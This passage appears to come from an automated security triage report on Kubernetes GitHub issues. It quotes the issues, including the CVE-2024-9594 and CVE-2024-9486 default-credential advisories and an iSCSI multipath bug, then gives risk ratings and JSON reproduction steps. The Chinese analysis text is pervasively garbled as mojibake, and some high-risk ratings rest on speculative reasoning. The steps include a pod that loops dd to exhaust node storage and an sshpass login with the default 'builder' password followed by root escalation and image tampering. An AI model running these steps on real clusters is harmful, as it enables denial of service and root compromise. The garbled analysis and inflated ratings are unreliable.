2. **å¤šç§Ÿæˆ·éš”ç¦»é£é™©**ï¼šåœ¨å¤šç”¨æˆ·æˆ–å¤šç§Ÿæˆ·åœºæ™¯ä¸‹ï¼Œä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡æ¶ˆè€—èŠ‚ç‚¹èµ„æºå½±å“å…¶ä»–ç”¨æˆ·çš„Podï¼Œè¿åäº†ç§Ÿæˆ·éš”ç¦»åŸåˆ™ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- **æ ‡å‡†1**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥è¡Œä¸ºï¼Œé€šè¿‡åœ¨è‡ªèº«Podä¸­æ¶ˆè€—èŠ‚ç‚¹èµ„æºï¼Œå½±å“å…¶ä»–ç”¨æˆ·çš„Podã€‚
- **æ ‡å‡†2**ï¼šè¯¥é£é™©å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼Œç¬¦åˆCVSS 3.1é«˜å±è¯„çº§çš„æ¡ä»¶ã€‚
- **æ ‡å‡†9**ï¼šåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸­ï¼Œä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“å’Œè‡ªå·±æƒé™ä¸€æ ·ç”šè‡³æ›´é«˜çš„å…¶ä»–ç”¨æˆ·ï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueå­˜åœ¨é«˜å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "cat <<EOF > vulnerable-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: vulnerable-pod\nspec:\n  terminationGracePeriodSeconds: 3600\n  containers:\n  - name: vulnerable-container\n    image: nginx\nEOF",
    "explain": "åˆ›å»ºä¸€ä¸ªå…·æœ‰3600ç§’ç»ˆæ­¢å®½é™æœŸçš„Podçš„é…ç½®æ–‡ä»¶ã€‚"
  },
  {
    "cmd": "kubectl apply -f vulnerable-pod.yaml",
    "explain": "éƒ¨ç½²å…·æœ‰é•¿ç»ˆæ­¢å®½é™æœŸçš„Podã€‚"
  },
  {
    "cmd": "cat <<EOF > attacker-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: attacker-pod\nspec:\n  containers:\n  - name: attacker-container\n    image: alpine\n    command: [\"/bin/sh\", \"-c\", \"while true; do dd if=/dev/zero of=/tmp/fill.txt bs=10M count=1024; done\"]\n    volumeMounts:\n    - name: temp-storage\n      mountPath: /tmp\n  volumes:\n  - name: temp-storage\n    emptyDir: {}\nEOF",
    "explain": "åˆ›å»ºä¸€ä¸ªæŒç»­å†™å…¥æ•°æ®ä»¥æ¶ˆè€—ä¸´æ—¶å­˜å‚¨çš„æ”»å‡»è€…Podçš„é…ç½®æ–‡ä»¶ã€‚"
  },
  {
    "cmd": "kubectl apply -f attacker-pod.yaml",
    "explain": "éƒ¨ç½²æ”»å‡»è€…Podä»¥å¼€å§‹æ¶ˆè€—èŠ‚ç‚¹çš„ä¸´æ—¶å­˜å‚¨èµ„æºã€‚"
  },
  {
    "cmd": "kubectl get pods",
    "explain": "æŸ¥çœ‹å½“å‰æ‰€æœ‰Podçš„çŠ¶æ€ï¼Œè§‚å¯Ÿvulnerable-podçš„çŠ¶æ€æ˜¯å¦ä¿æŒä¸ºRunningã€‚"
  },
  {
    "cmd": "kubectl describe pod vulnerable-pod",
    "explain": "æŸ¥çœ‹vulnerable-podçš„è¯¦ç»†ä¿¡æ¯ï¼Œç¡®è®¤å…¶çŠ¶æ€å’Œäº‹ä»¶æ—¥å¿—ã€‚"
  },
  {
    "cmd": "kubectl get endpoints",
    "explain": "æ£€æŸ¥vulnerable-podæ˜¯å¦ä»ç„¶åœ¨æœåŠ¡ç«¯ç‚¹åˆ—è¡¨ä¸­ã€‚"
  }
]
```

---

## Issue #128059 iscsi/fc volume with multipath can be incorrectly resolved to partition

- Issue é“¾æ¥ï¼š[#128059](https://github.com/kubernetes/kubernetes/issues/128059)

### Issue å†…å®¹

#### What happened?

If worker nodes are configured so that multipath symlink under `/dev/disk/by-id` points directly to device mapper device (dm-X) the FC/iSCSI volume plugin code in Kubernetes can not handle this well and finds incorrect device.

This is because `FindMultipathDeviceForDevice` function can be called with already resolved symlink and still tries to resolve it further to find its parent - this can resolve in matching a partition of the device, see details below.


If we have a multipath device `scsi-36001405f3392bf76369422cbfd8acd80` pointing to `dm-2`:

```
ls -l /dev/disk/by-id/scsi-36001405f3392bf76369422cbfd8acd80
lrwxrwxrwx. 1 root root 10 Oct 14 14:43 /dev/disk/by-id/scsi-36001405f3392bf76369422cbfd8acd80 -> ../../dm-2
```

This function will try to lookup it's parent, finding `dm-3`:
```
# ls -la /sys/block/dm-3/slaves
total 0
drwxr-xr-x. 2 root root 0 Oct 14 16:29 .
drwxr-xr-x. 9 root root 0 Oct 14 14:43 ..
lrwxrwxrwx. 1 root root 0 Oct 14 14:44 dm-2 -> ../../dm-2
```

Which is actually a partition of the device:
```
# ls -l /dev/disk/by-id/dm-uuid-part1-mpath-36001405f3392bf76369422cbfd8acd80
lrwxrwxrwx. 1 root root 10 Oct 14 14:43 /dev/disk/by-id/dm-uuid-part1-mpath-36001405f3392bf76369422cbfd8acd80 -> ../../dm-3
```

Multipath and partitions configured:
```
# lsblk
NAME              MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINTS
sda                 8:0    0    50M  0 disk
â””â”€mpathh          253:2    0    50M  0 mpath
  â””â”€mpathh1       253:3    0    10M  0 part
sdb                 8:16   0    50M  0 disk
â””â”€mpathh          253:2    0    50M  0 mpath
  â””â”€mpathh1       253:3    0    10M  0 part
  ...
```

Pod has mounted/attached `253:3` device which is the partition:
```
# crictl inspect 7d8b037b74949 | grep -A3 /dev/data
            "path": "/dev/data",
            "type": "b",
            "major": 253,
            "minor": 3,
```

#### What did you expect to happen?

Should match multipath device instead:

```
# crictl inspect e003f05e7f406 | grep -A 3 /dev/data
            "path": "/dev/data",
            "type": "b",
            "major": 253,
            "minor": 2,
# lsblk| grep "253:2"
â””â”€mpathh          253:2    0    50M  0 mpath
â””â”€mpathh          253:2    0    50M  0 mpath
```


#### How can we reproduce it (as minimally and precisely as possible)?

Locally with `local-up-cluster.sh`, attaching "fake" loopback device as iSCSI:

- create a loopback device -> `dd if=/dev/zero of=/srv/iscsi/file.img count=102400 && losetup /dev/loop1 /srv/iscsi/file.img`
- partition the loopback device -> `fdisk /dev/loop1`
- configure iSCSI initiator using `targetcli` with  `/dev/loop1` as backing block device
- discover and attach iSCSI disk to node using both local and loopback IPs to simulate multipath
- enable multipath with `mpathconf --enable --with_multipathd y`
- start local Kubernetes with `local-up-cluster.sh`
- create PV, PVC and Pod:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: fc-pv
  labels:
    volumeName: fc-pv-01
spec:
  volumeMode: Block
  accessModes:
    - ReadWriteOnce
  capacity:
    storage: 50M
  fc:
    wwids: ['36001405f3392bf76369422cbfd8acd80']
```

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: fc-pvc
spec:
  volumeMode: Block
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 50M
  selector:
    matchLabels:
      volumeName: fc-pv-01
```

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: fc-pod
spec:
  containers:
  - name: busybox
    image: busybox
    command: [ "sh", "-c", "sleep infinity" ]
    volumeDevices:
      - name: fc-storage
        devicePath: /dev/data
  volumes:
  - name: fc-storage
    persistentVolumeClaim:
      claimName: fc-pvc
```

- inspect running pod for attached devices with chosen container runtime -> `crictl inspect <pod_id> | grep -A3 /dev/data`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0-alpha.0.1350+fc93fcdcf2dbcd
```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Fedora Linux"
VERSION="39 (Workstation Edition)"
ID=fedora
VERSION_ID=39
VERSION_CODENAME=""
PLATFORM_ID="platform:f39"
PRETTY_NAME="Fedora Linux 39 (Workstation Edition)"
ANSI_COLOR="0;38;2;60;110;180"
LOGO=fedora-logo-icon
CPE_NAME="cpe:/o:fedoraproject:fedora:39"
DEFAULT_HOSTNAME="fedora"
HOME_URL="https://fedoraproject.org/"
DOCUMENTATION_URL="https://docs.fedoraproject.org/en-US/fedora/f39/system-administrators-guide/"
SUPPORT_URL="https://ask.fedoraproject.org/"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_BUGZILLA_PRODUCT="Fedora"
REDHAT_BUGZILLA_PRODUCT_VERSION=39
REDHAT_SUPPORT_PRODUCT="Fedora"
REDHAT_SUPPORT_PRODUCT_VERSION=39
SUPPORT_END=2024-11-12
VARIANT="Workstation Edition"
VARIANT_ID=workstation
$ uname -a
Linux fedora 6.9.5-100.fc39.x86_64 #1 SMP PREEMPT_DYNAMIC Sun Jun 16 15:57:19 UTC 2024 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
N/A
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
$ crictl version
Version:  0.1.0
RuntimeName:  cri-o
RuntimeVersion:  1.27.2
RuntimeApiVersion:  v1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“workerèŠ‚ç‚¹é…ç½®äº†multipathå¹¶ä¸”symlinkåœ¨`/dev/disk/by-id`ä¸‹ç›´æ¥æŒ‡å‘è®¾å¤‡æ˜ å°„å™¨è®¾å¤‡ï¼ˆå¦‚dm-Xï¼‰æ—¶ï¼ŒKubernetesçš„FC/iSCSIå·æ’ä»¶å¯èƒ½æ— æ³•æ­£ç¡®å¤„ç†ï¼Œå¯¼è‡´æ‰¾åˆ°é”™è¯¯çš„è®¾å¤‡ï¼Œå¯èƒ½ä¼šå°†åˆ†åŒºä½œä¸ºè®¾å¤‡æŒ‚è½½åˆ°Podä¸­ã€‚

è¿™ç§é”™è¯¯çš„è®¾å¤‡è§£æå¯èƒ½å¯¼è‡´Podè®¿é—®åˆ°æ„å¤–çš„åˆ†åŒºï¼Œå¦‚æœè¿™äº›åˆ†åŒºåŒ…å«äº†å…¶ä»–ç”¨æˆ·æˆ–ç³»ç»Ÿçš„æ•æ„Ÿæ•°æ®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­è®¿é—®æœªç»æˆæƒçš„æ•°æ®ï¼Œé€ æˆæ•°æ®æ³„éœ²æˆ–ç ´åã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬9æ¡ï¼Œå¦‚æœåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå½±å“å’Œè‡ªå·±æƒé™ä¸€æ ·ç”šè‡³æ›´é«˜çš„å…¶ä»–ç”¨æˆ·ï¼Œåˆ™åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚å› æ­¤ï¼Œæ­¤é—®é¢˜å¯èƒ½å¯¼è‡´é«˜å®‰å…¨é£é™©ï¼Œåº”è§†ä¸ºé«˜é£é™©æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "dd if=/dev/zero of=/srv/iscsi/file.img bs=1M count=100",
    "explain": "åˆ›å»ºä¸€ä¸ªç”¨äºæ¨¡æ‹ŸiSCSIè®¾å¤‡çš„100MBç©ºç™½é•œåƒæ–‡ä»¶ã€‚"
  },
  {
    "cmd": "losetup /dev/loop1 /srv/iscsi/file.img",
    "explain": "å°†åˆ›å»ºçš„é•œåƒæ–‡ä»¶ç»‘å®šåˆ°loopbackè®¾å¤‡/dev/loop1ã€‚"
  },
  {
    "cmd": "echo -e \"o\\nn\\np\\n1\\n\\n\\nw\" | fdisk /dev/loop1",
    "explain": "å¯¹loopbackè®¾å¤‡è¿›è¡Œåˆ†åŒºï¼Œåˆ›å»ºä¸€ä¸ªä¸»åˆ†åŒºã€‚"
  },
  {
    "cmd": "targetcli /backstores/block create name=iscsi_disk dev=/dev/loop1",
    "explain": "ä½¿ç”¨targetcliåˆ›å»ºä¸€ä¸ªå—è®¾å¤‡åç«¯ï¼Œåç§°ä¸ºiscsi_diskï¼Œè®¾å¤‡ä¸º/dev/loop1ã€‚"
  },
  {
    "cmd": "targetcli /iscsi create iqn.2023-10.com.example:storage",
    "explain": "åˆ›å»ºä¸€ä¸ªiSCSIç›®æ ‡ï¼ŒIQNä¸ºiqn.2023-10.com.example:storageã€‚"
  },
  {
    "cmd": "targetcli /iscsi/iqn.2023-10.com.example:storage/tpg1/luns create /backstores/block/iscsi_disk",
    "explain": "å°†ä¹‹å‰åˆ›å»ºçš„å—è®¾å¤‡åç«¯æ˜ å°„ä¸ºiSCSIç›®æ ‡çš„LUNã€‚"
  },
  {
    "cmd": "targetcli /iscsi/iqn.2023-10.com.example:storage/tpg1/acls create iqn.2023-10.com.example:initiator",
    "explain": "ä¸ºiSCSIç›®æ ‡æ·»åŠ ä¸€ä¸ªACLï¼Œå…è®¸æŒ‡å®šçš„initiatorè®¿é—®ã€‚"
  },
  {
    "cmd": "iscsiadm -m discovery -t sendtargets -p 127.0.0.1",
    "explain": "åœ¨æœ¬åœ°èŠ‚ç‚¹ä¸Šå‘ç°iSCSIç›®æ ‡ã€‚"
  },
  {
    "cmd": "iscsiadm -m node -T iqn.2023-10.com.example:storage -p 127.0.0.1 --login",
    "explain": "ç™»å½•åˆ°iSCSIç›®æ ‡ï¼Œå»ºç«‹ä¼šè¯ã€‚"
  },
  {
    "cmd": "mpathconf --enable --with_multipathd y",
    "explain": "å¯ç”¨multipathå¹¶å¯åŠ¨multipathdå®ˆæŠ¤è¿›ç¨‹ã€‚"
  },
  {
    "cmd": "./local-up-cluster.sh",
    "explain": "å¯åŠ¨æœ¬åœ°çš„Kubernetesé›†ç¾¤ã€‚"
  },
  {
    "cmd": "kubectl apply -f fc-pv.yaml",
    "explain": "åˆ›å»ºFCç±»å‹çš„PersistentVolumeã€‚"
  },
  {
    "cmd": "kubectl apply -f fc-pvc.yaml",
    "explain": "åˆ›å»ºPersistentVolumeClaimã€‚"
  },
  {
    "cmd": "kubectl apply -f fc-pod.yaml",
    "explain": "åˆ›å»ºä½¿ç”¨ä¸Šè¿°PVCçš„Podã€‚"
  },
  {
    "cmd": "crictl ps | grep fc-pod | awk '{print $1}' | xargs crictl inspect | grep -A3 /dev/data",
    "explain": "æ£€æŸ¥è¿è¡Œä¸­çš„Podï¼ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„è®¾å¤‡ä¿¡æ¯ã€‚"
  },
  {
    "cmd": "ls -l /dev/disk/by-id/ | grep dm-",
    "explain": "æŸ¥çœ‹è®¾å¤‡æ˜ å°„å™¨ä¸­çš„è®¾å¤‡åŠå…¶ç¬¦å·é“¾æ¥å…³ç³»ã€‚"
  },
  {
    "cmd": "lsblk",
    "explain": "æŸ¥çœ‹å—è®¾å¤‡åˆ—è¡¨ï¼Œç¡®å®šå“ªä¸ªè®¾å¤‡æ˜¯multipathè®¾å¤‡ï¼Œå“ªä¸ªæ˜¯åˆ†åŒºã€‚"
  }
]
```

---

## Issue #128007 CVE-2024-9594: VM images built with Image Builder with some providers use default credentials during builds

- Issue é“¾æ¥ï¼š[#128007](https://github.com/kubernetes/kubernetes/issues/128007)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H)

A security issue was discovered in the Kubernetes Image Builder where default credentials are enabled during the image build process when using the Nutanix, OVA, QEMU or raw providers. The credentials can be used to gain root access. The credentials are disabled at the conclusion of the image build process. Kubernetes clusters are only affected if their nodes use VM images created via the Image Builder project. 

#### Am I vulnerable?

Clusters using virtual machine images built with Kubernetes Image Builder (https://github.com/kubernetes-sigs/image-builder) version v0.1.37 or earlier are affected if built with the Nutanix, OVA, QEMU or raw providers. These images were vulnerable during the image build process and are affected only if an attacker was able to reach the VM where the image build was happening and used the vulnerability to modify the image at the time the image build was occurring.

VMs using images built with the Proxmox provider are affected by a related, but much more serious vulnerability (see #128006).

VMs using images built with all other providers are not affected by this issue.

To determine the version of Image Builder you are using, use one of the following methods:
- For git clones of the image builder repository:
```
    cd <local path to image builder repo>
    make version
```
- For installations using a tarball download:
```
    cd <local path to install location>
    grep -o v0\\.[0-9.]* RELEASE.md | head -1
```
- For a container image release:
    `docker run --rm <image pull spec> version`
  or
    `podman run --rm <image pull spec> version`
  or look at the image tag specified, in the case of an official image such as `registry.k8s.io/scl-image-builder/cluster-node-image-builder-amd64:v0.1.37`


##### Affected Versions

- Kubernetes Image Builder versions <= v0.1.37

#### How do I mitigate this vulnerability?

Rebuild any affected images using a fixed version of Image Builder. Re-deploy the fixed images to any affected VMs.

##### Fixed Versions

- Kubernetes Image Builder master - fixed by https://github.com/kubernetes-sigs/image-builder/pull/1596
- Fixed in Kubernetes Image Builder release v0.1.38

#### Detection

The linux command `last builder` can be used to view logins to the affected `builder` account.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

## Additional Details

The fixed version sets a randomly-generated password for the duration of the image build

##### Acknowledgements

This vulnerability was reported by Nicolai Rybnikar @rybnico from Rybnikar Enterprises GmbH.

The issue was fixed and coordinated by Marcus Noble of the Image Builder project.

/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig cluster-lifecycle

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
åœ¨Kubernetes Image Builderä¸­ï¼Œä½¿ç”¨Nutanixã€OVAã€QEMUæˆ–raw providersæ—¶ï¼Œé•œåƒæ„å»ºè¿‡ç¨‹ä¸­å¯ç”¨äº†é»˜è®¤å‡­è¯ã€‚è¿™äº›é»˜è®¤å‡­è¯å¯ä»¥è¢«ç”¨äºè·å–rootæƒé™ï¼Œè™½ç„¶åœ¨é•œåƒæ„å»ºç»“æŸåï¼Œè¿™äº›å‡­è¯ä¼šè¢«ç¦ç”¨ã€‚

æ”»å‡»è€…å¦‚æœèƒ½å¤Ÿåœ¨é•œåƒæ„å»ºè¿‡ç¨‹ä¸­è®¿é—®æ­£åœ¨æ„å»ºçš„VMï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›é»˜è®¤å‡­è¯ç™»å½•ï¼Œè·å–rootæƒé™ï¼Œå¯¹é•œåƒè¿›è¡Œæœªæˆæƒçš„ä¿®æ”¹ï¼Œä¾‹å¦‚æ¤å…¥åé—¨æˆ–æ¶æ„ä»£ç ã€‚è¿™ä¼šå¯¼è‡´ä½¿ç”¨è¯¥é•œåƒéƒ¨ç½²çš„é›†ç¾¤å­˜åœ¨å®‰å…¨éšæ‚£ï¼Œå¯èƒ½é­å—è¿œç¨‹æ§åˆ¶ã€æ•°æ®æ³„éœ²ç­‰æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨é»˜è®¤å‡­è¯è·å–rootæƒé™ï¼Œå±äºé«˜é£é™©ã€‚
2. **æ”»å‡»è€…å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€ææƒç­‰é«˜é£é™©æ“ä½œ**ï¼šç¬¦åˆç¬¬8æ¡ï¼Œæ— è®ºæ”»å‡»è€…æ˜¯å¦éœ€è¦æƒé™ï¼Œéƒ½åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

å› æ­¤ï¼Œè¯¥Issueå­˜åœ¨**é«˜é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "sshpass -p 'builder' ssh builder@<ip_address>",
    "explain": "ä½¿ç”¨é»˜è®¤ç”¨æˆ·åå’Œå¯†ç 'builder'è¿æ¥åˆ°æ­£åœ¨æ„å»ºçš„VMã€‚"
  },
  {
    "cmd": "sudo su -",
    "explain": "æˆåŠŸç™»å½•åï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·ã€‚"
  },
  {
    "cmd": "echo 'æ¶æ„å†…å®¹' >> /path/to/target/file",
    "explain": "åœ¨VMä¸­æ‰§è¡Œå‘½ä»¤ï¼Œæ’å…¥æ¶æ„å†…å®¹åˆ°é•œåƒä¸­ã€‚"
  }
]
```

---

## Issue #128006 CVE-2024-9486: VM images built with Image Builder and Proxmox provider use default credentials

- Issue é“¾æ¥ï¼š[#128006](https://github.com/kubernetes/kubernetes/issues/128006)

### Issue å†…å®¹

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

A security issue was discovered in the Kubernetes Image Builder where default credentials are enabled during the image build process. Additionally, virtual machine images built using the Proxmox provider do not disable these default credentials, and nodes using the resulting images may be accessible via these default credentials. The credentials can be used to gain root access. Kubernetes clusters are only affected if their nodes use VM images created via the Image Builder project with its Proxmox provider. 

#### Am I vulnerable?

Clusters using virtual machine images built with Kubernetes Image Builder (https://github.com/kubernetes-sigs/image-builder) version v0.1.37 or earlier are affected if built with the Proxmox provider.

VMs using images built with all other providers are not affected by this issue.  See #128007 for a related issue which affects some other providers.

To determine the version of Image Builder you are using, use one of the following methods:
- For git clones of the image builder repository:
```
    cd <local path to image builder repo>
    make version
```
- For installations using a tarball download:
```
    cd <local path to install location>
    grep -o v0\\.[0-9.]* RELEASE.md | head -1
```
- For a container image release:
    `docker run --rm <image pull spec> version`
  or
    `podman run --rm <image pull spec> version`
  or look at the image tag specified, in the case of an official image such as `registry.k8s.io/scl-image-builder/cluster-node-image-builder-amd64:v0.1.37`


##### Affected Versions

- Kubernetes Image Builder versions <= v0.1.37

#### How do I mitigate this vulnerability?

Rebuild any affected images using a fixed version of Image Builder. Re-deploy the fixed images to any affected VMs.

Prior to upgrading, this vulnerability can be mitigated by disabling the builder account on affected VMs:
usermod -L builder

##### Fixed Versions

- Kubernetes Image Builder master - fixed by https://github.com/kubernetes-sigs/image-builder/pull/1595
- Fixed in Kubernetes Image Builder release v0.1.38

#### Detection

The linux command `last builder` can be used to view logins to the affected `builder` account.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

## Additional Details

The fixed version makes two changes to remedy this bug:
- It sets a randomly-generated password for the duration of the image build
- It disables the builder account at the conclusion of the image build

##### Acknowledgements

This vulnerability was reported by Nicolai Rybnikar @rybnico from Rybnikar Enterprises GmbH.

The issue was fixed and coordinated by Marcus Noble of the Image Builder project.

/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig cluster-lifecycle


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kubernetes Image Builderåœ¨ä½¿ç”¨Proxmoxæä¾›å•†æ—¶å­˜åœ¨çš„å®‰å…¨æ¼æ´ã€‚å…·ä½“æ¥è¯´ï¼Œä½¿ç”¨ç‰ˆæœ¬v0.1.37æˆ–æ›´æ—©ç‰ˆæœ¬æ„å»ºçš„è™šæ‹Ÿæœºé•œåƒä¼šå¯ç”¨é»˜è®¤å‡­æ®ï¼Œè¿™äº›é»˜è®¤å‡­æ®åœ¨ç”Ÿæˆçš„é•œåƒä¸­æœªè¢«ç¦ç”¨ã€‚ç»“æœæ˜¯ï¼Œä½¿ç”¨è¿™äº›é•œåƒçš„èŠ‚ç‚¹å¯èƒ½é€šè¿‡è¿™äº›é»˜è®¤å‡­æ®è¢«è®¿é—®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›å‡­æ®è·å–rootæƒé™ã€‚

æ ¹æ®CVSSè¯„åˆ† [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]ï¼Œè¯¥æ¼æ´çš„æŒ‡æ ‡ä¸ºï¼š

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNï¼‰
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰
- **æ‰€éœ€æƒé™ï¼ˆPRï¼‰**ï¼šæ— ï¼ˆNï¼‰
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— ï¼ˆNï¼‰
- **ä½œç”¨èŒƒå›´ï¼ˆSï¼‰**ï¼šæœªå˜ï¼ˆUï¼‰
- **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šé«˜ï¼ˆHï¼‰
- **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šé«˜ï¼ˆHï¼‰
- **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHï¼‰

æ ¹æ®è¿™äº›æŒ‡æ ‡ï¼Œæ¼æ´çš„CVSSè¯„åˆ†ä¸º**9.8**ï¼Œå±äºé«˜å±çº§åˆ«ã€‚

**é£é™©åˆ†æï¼š**

- **å¯è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ç½‘ç»œè¿œç¨‹ä½¿ç”¨é»˜è®¤å‡­æ®ç™»å½•å—å½±å“çš„èŠ‚ç‚¹ï¼Œè·å–rootæƒé™ã€‚
- **å¯èƒ½æˆä¸ºé«˜å±æ¼æ´**ï¼šå·²è¢«åˆ†é…CVE-2024-9486ï¼ŒCVSSè¯„åˆ†ä¸ºé«˜å±ï¼ˆ9.8ï¼‰ã€‚
- **å¯èƒ½å¯¼è‡´é«˜å®‰å…¨é£é™©**ï¼šæ”»å‡»è€…è·å¾—rootæƒé™åï¼Œå¯èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤ã€çªƒå–æ•æ„Ÿä¿¡æ¯ã€ç ´åç³»ç»Ÿå®Œæ•´æ€§å’Œå¯ç”¨æ€§ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥æ¼æ´æ»¡è¶³é«˜é£é™©æ¡ä»¶ï¼Œéœ€è¦ç«‹å³é‡‡å–æªæ–½ä¿®å¤ã€‚

---

## Issue #128001 kube-api proxy does not proxy to kubelet running on `127.0.0.1`

- Issue é“¾æ¥ï¼š[#128001](https://github.com/kubernetes/kubernetes/issues/128001)

### Issue å†…å®¹

#### What happened?

While running Kubernetes locally, using `./hack/local-cluster-up.sh`, I wanted to send requests to the kubelet `proxy` endpoint in the api-server, like this:

```
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"   https://localhost:6443/api/v1/nodes/127.0.0.1/proxy/healthz
```

The response returned a `400` HTTP status code and the message was `address not allowed`.

#### What did you expect to happen?

I've expected that the request is able to proxy to IP address `127.0.0.1` successfully because it is the node's IP address.

#### How can we reproduce it (as minimally and precisely as possible)?

Run kubernetes with `hack/local-up-cluster.sh` scripts locally (or kubelet running on 127.0.0.1).

Assign the `system:kubelet-api-admin` role to Pod's service account, mount the Service Account token and run the following curl command:

curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"   https://localhost:6443/api/v1/nodes/127.0.0.1/proxy/healthz


#### Anything else we need to know?

The following check for a Global Unicast address causes the error message: https://github.com/kubernetes/kubernetes/blob/1dc05009fe7f4e1d139b0c8394683edb54f8d082/pkg/registry/core/node/strategy.go#L248-L250

I think there should a special case to handle when kubelet runs on 127.0.0.1 and is accessible.

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.0", GitCommit:"7c48c2bd72b9bf5c44d21d7338cc7bea77d0ad2a", GitTreeState:"clean", BuildDate:"2024-05-13T22:00:36Z", GoVersion:"go1.22.2", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
localhost 
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Fedora Linux"
VERSION="39 (Workstation Edition)"
ID=fedora
VERSION_ID=39
VERSION_CODENAME=""
PLATFORM_ID="platform:f39"
PRETTY_NAME="Fedora Linux 39 (Workstation Edition)"
ANSI_COLOR="0;38;2;60;110;180"
LOGO=fedora-logo-icon
CPE_NAME="cpe:/o:fedoraproject:fedora:39"
DEFAULT_HOSTNAME="fedora"
HOME_URL="https://fedoraproject.org/"
DOCUMENTATION_URL="https://docs.fedoraproject.org/en-US/fedora/f39/system-administrators-guide/"
SUPPORT_URL="https://ask.fedoraproject.org/"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_BUGZILLA_PRODUCT="Fedora"
REDHAT_BUGZILLA_PRODUCT_VERSION=39
REDHAT_SUPPORT_PRODUCT="Fedora"
